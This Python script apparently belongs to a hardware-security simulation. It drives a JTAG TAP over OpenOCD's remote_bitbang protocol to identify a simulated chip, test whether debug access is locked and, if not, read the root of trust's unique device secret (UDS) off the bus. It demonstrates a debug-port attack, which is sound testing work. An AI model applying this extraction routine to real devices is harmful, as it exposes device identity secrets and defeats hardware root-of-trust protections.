"""
A JTAG probe, used the way an attacker with the board in hand would use one.

The simulator's jtagremote module stands in for the probe's cable. It speaks OpenOCD's remote_bitbang
protocol over TCP:  '0'..'7' drive TCK, TMS and TDI (bits 2, 1 and 0), and 'R' samples TDO.
"""
import socket
import time

IDCODE, ADDR, MEMREAD, BYPASS = 0x1, 0x8, 0x9, 0xF  # the TAP's instructions, from the chip's datasheet

class Probe:
    def __init__(self, port):
        for _ in range(600):  # the simulator needs a moment to open its port
            try:
                self.sock = socket.create_connection(("127.0.0.1", port))
                return
            except ConnectionRefusedError:
                time.sleep(0.1)
        raise RuntimeError(f"no JTAG port on {port}")

    def clock(self, bits):
        """One TCK cycle per (tms, tdi) pair. Returns TDO as sampled before each rising edge."""
        self.sock.sendall(b"".join(b"%dR%d" % (tms << 1 | tdi, 4 | tms << 1 | tdi) for tms, tdi in bits))
        tdo = b""
        while len(tdo) < len(bits):
            tdo += self.sock.recv(len(bits) - len(tdo))
        return [c - ord("0") for c in tdo]

    def reset(self):
        """Five TCKs with TMS high reach Test-Logic-Reset from any state. Then go to Run-Test/Idle."""
        self.clock([(1, 0)] * 5 + [(0, 0)])

    def scan(self, register, value, n):
        """Shift n bits of value into the IR or the DR, starting and ending in Run-Test/Idle.
        Returns the n bits that came out: what the register captured."""
        select = {"DR": 1, "IR": 2}[register]                       # TMS=1 once for Select-DR, twice for Select-IR
        bits  = [(1, 0)] * select + [(0, 0), (0, 0)]                 # -> Capture -> Shift
        bits += [(int(i == n - 1), value >> i & 1) for i in range(n)]  # shift LSB first; TMS=1 on the last bit -> Exit1
        bits += [(1, 0), (0, 0)]                                     # -> Update -> Run-Test/Idle
        out = self.clock(bits)[select + 2 : select + 2 + n]
        return sum(bit << i for i, bit in enumerate(out))

    def read(self, address, nwords):
        """Read words from the chip's bus through the TAP's debug instructions."""
        self.scan("IR", ADDR, 4)
        self.scan("DR", address, 32)
        self.scan("IR", MEMREAD, 4)
        return [self.scan("DR", 0, 32) for _ in range(nwords)]

def attack(port, csr):
    """Identify the chip, then try to read the UDS out of the RoT. Returns the UDS bytes, or None."""
    probe = Probe(port)
    probe.reset()
    idcode = probe.scan("DR", 0, 32)  # after reset the TAP's instruction is IDCODE
    print(f"[jtag] probe attached, IDCODE {idcode:#010x}: part {idcode >> 12 & 0xFFFF:#06x}, version {idcode >> 28}")

    status = probe.scan("IR", BYPASS, 4)  # Capture-IR shifts out the TAP's status
    if not status & 0b1000:
        print("[jtag] TAP status: debug access LOCKED, only IDCODE and BYPASS answer")
        return None
    print("[jtag] TAP status: debug access ENABLED, the probe can read the chip's bus")

    locked = probe.read(csr["rot_locked"]["addr"], 1)[0]
    print(f"[jtag] RoT lock register: {locked} ({'locked' if locked else 'the boot ROM has not locked it yet'})")
    words = probe.read(csr["rot_uds"]["addr"], 8)
    uds = b"".join(w.to_bytes(4, "big") for w in words)  # word 0 is the most significant
    print(f"[jtag] UDS read through the RoT registers: {uds.hex()}")
    return uds
